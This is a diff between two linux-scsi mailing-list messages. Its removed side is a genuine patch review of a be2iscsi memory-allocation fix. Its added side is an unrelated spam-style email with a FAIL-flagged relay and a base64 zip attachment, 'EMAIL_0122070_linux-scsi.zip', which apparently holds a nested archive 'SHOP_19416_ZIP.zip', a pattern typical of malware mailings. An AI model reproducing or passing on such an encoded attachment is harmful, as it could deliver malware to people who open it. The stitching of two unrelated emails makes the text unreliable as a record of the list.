@@ -1,57 +1,110 @@
-From: Jitendra Bhivare <jitendra.bhivare@broadcom.com>
-Subject: RE: [patch] scsi: be2iscsi: allocate enough memory in beiscsi_boot_get_sinfo()
-Date: Mon, 21 Nov 2016 09:32:49 +0530
-Message-ID: <eecde6c0e84128fb594e83874d08e05c@mail.gmail.com>
-References: <20161118115339.GD3281@mwanda>
+From: <junplzen@cmkos.cz>
+Subject: 10503 linux-scsi
+Date: Mon, 21 Nov 2016 04:36:41 -0000
+Message-ID: <147970300166.5036.18076734402153898269@redewsp.com.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="EMAIL_0122070_linux-scsi.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mail-ua0-f179.google.com ([209.85.217.179]:33368 "EHLO
-        mail-ua0-f179.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752851AbcKUECv (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Sun, 20 Nov 2016 23:02:51 -0500
-Received: by mail-ua0-f179.google.com with SMTP id 20so216651691uak.0
-        for <linux-scsi@vger.kernel.org>; Sun, 20 Nov 2016 20:02:51 -0800 (PST)
-In-Reply-To: <20161118115339.GD3281@mwanda>
+Received: from 50-94-184-177.redewsp.com.br ([177.184.94.50]:49763 "HELO
+        redewsp.com.br" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751713AbcKUEgt (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>); Sun, 20 Nov 2016 23:36:49 -0500
+Content-Disposition: attachment
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Dan Carpenter <dan.carpenter@oracle.com>, Subramanian Seetharaman <subbu.seetharaman@broadcom.com>
-Cc: Ketan Mukadam <ketan.mukadam@broadcom.com>, "James E.J. Bottomley" <jejb@linux.vnet.ibm.com>, "Martin K. Petersen" <martin.petersen@oracle.com>, linux-scsi@vger.kernel.org, kernel-janitors@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-> -----Original Message-----
-> From: Dan Carpenter [mailto:dan.carpenter@oracle.com]
-> Sent: Friday, November 18, 2016 5:24 PM
-> To: Subbu Seetharaman; Jitendra Bhivare
-> Cc: Ketan Mukadam; James E.J. Bottomley; Martin K. Petersen; linux-
-> scsi@vger.kernel.org; kernel-janitors@vger.kernel.org
-> Subject: [patch] scsi: be2iscsi: allocate enough memory in
-> beiscsi_boot_get_sinfo()
->
-> We accidentally allocate sizeof(u32) instead of sizeof(struct
-> be_cmd_get_session_resp).
->
-> Fixes: 50a4b824be9e ("scsi: be2iscsi: Fix to make boot discovery
-non-blocking")
-> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
->
-> diff --git a/drivers/scsi/be2iscsi/be_mgmt.c
-b/drivers/scsi/be2iscsi/be_mgmt.c
-> index aebc4dd..ac05317b 100644
-> --- a/drivers/scsi/be2iscsi/be_mgmt.c
-> +++ b/drivers/scsi/be2iscsi/be_mgmt.c
-> @@ -1083,7 +1083,7 @@ unsigned int beiscsi_boot_get_sinfo(struct
-> beiscsi_hba *phba)
->  	nonemb_cmd = &phba->boot_struct.nonemb_cmd;
->  	nonemb_cmd->size = sizeof(*resp);
->  	nonemb_cmd->va = pci_alloc_consistent(phba->ctrl.pdev,
-> -					      sizeof(nonemb_cmd->size),
-> +					      nonemb_cmd->size,
->  					      &nonemb_cmd->dma);
->  	if (!nonemb_cmd->va) {
->  		mutex_unlock(&ctrl->mbox_lock);
-
-Reviewed by: Jitendra Bhivare <jitendra.bhivare@broadcom.com>
-
-Thanks,
-
-JB
+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
